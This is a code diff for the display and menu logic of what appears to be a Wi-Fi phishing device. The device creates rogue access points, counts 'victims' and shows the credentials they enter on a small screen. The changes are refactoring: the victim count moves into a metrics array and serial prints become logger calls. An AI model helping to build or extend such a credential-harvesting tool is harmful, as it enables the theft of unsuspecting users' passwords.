@@ -85,23 +85,6 @@ String StatusMetrics[3] = {
   " client/s",
   " total"
 };
-enum METRICS {
-  MTR_VICTIMS = 0,
-  MTR_CLIENTS,
-  MTR_TOTAL,
-  MTR_MAX_ELEM
-};
-
-/**********************************
- * In this array will be recorded the 
- * credentials leaves by the victims
- * totalRecords will keep the total 
- * number of credentials recorded (
- * it will be saved also as first record
- * of the MetricsData array)
- */
-String ResultList[1000];
-long totalRecords = 0;
 
 /**********************************
  * Each screen will show the nth element 
@@ -164,8 +147,8 @@ void UpdateDisplay(){
       ElementLine2 = String(MetricsData[actualLine % MTR_MAX_ELEM]) + StatusMetrics[actualLine % MTR_MAX_ELEM];
       break;
     case RESULT_SCREEN:
-      if (totalRecords > 0)
-        ElementLine2 = ResultList[actualLine % totalRecords];
+      if (MetricsData[MTR_VICTIMS] > 0)
+        ElementLine2 = ResultList[actualLine % MetricsData[MTR_VICTIMS]];
       else
         ElementLine2 = "NO records!";
       break;
@@ -201,7 +184,7 @@ void Activate(){
       DrawDisplay("-WORKING-", "Creating AP!");
       if (InitializationAP(AvailableAP[actualLine % size_of_Array(AvailableAP)]) != CS_SUCCESS){
         DrawDisplay("-ERROR-", "Creating AP failed!");
-        Serial.println("Creating AP failed!");
+        Logger::WriteLog(LOG_ERROR, "Creating AP failed!");
         delay(5000);
       }
       currentScreen = ACTIVE_SCREEN;
@@ -209,16 +192,15 @@ void Activate(){
     case ACTIVE_SCREEN:
       switch(actualLine % size_of_Array(ActiveActions)){
         case 0:   // "Stop AP"
-          Serial.println("Stopping AP");
           StopAP();
           currentScreen = HOME_SCREEN;
           break;
         case 1:   // "Status"
-          Serial.println("switching on status");
+          Logger::WriteLog(LOG_INFO, "Switching on status!");
           currentScreen = STATUS_SCREEN;
           break;
         case 2:   // "Records"
-          Serial.println("switching on records");
+          Logger::WriteLog(LOG_INFO, "Switching on records!");
           currentScreen = RESULT_SCREEN;
           break;
         default:
@@ -267,16 +249,16 @@ void displayLoop(ACTIONS action) {
    * Do action based on the button pressed */
   switch (action) {
     case ACT_UP:
-      Serial.println("ACT_UP");
+      Logger::WriteLog(LOG_DEBUG, "UP button pressed!");
       actualLine--;
       break;
     case ACT_CONFIRM:
-      Serial.println("ACT_CONFIRM");
+      Logger::WriteLog(LOG_DEBUG, "CONFIRM button pressed!");
       Activate();
       actualLine = 0;
       break;
     case ACT_DOWN:
-      Serial.println("ACT_DOWN");
+      Logger::WriteLog(LOG_DEBUG, "DOWN button pressed!");
       actualLine++;
       break;
     default:
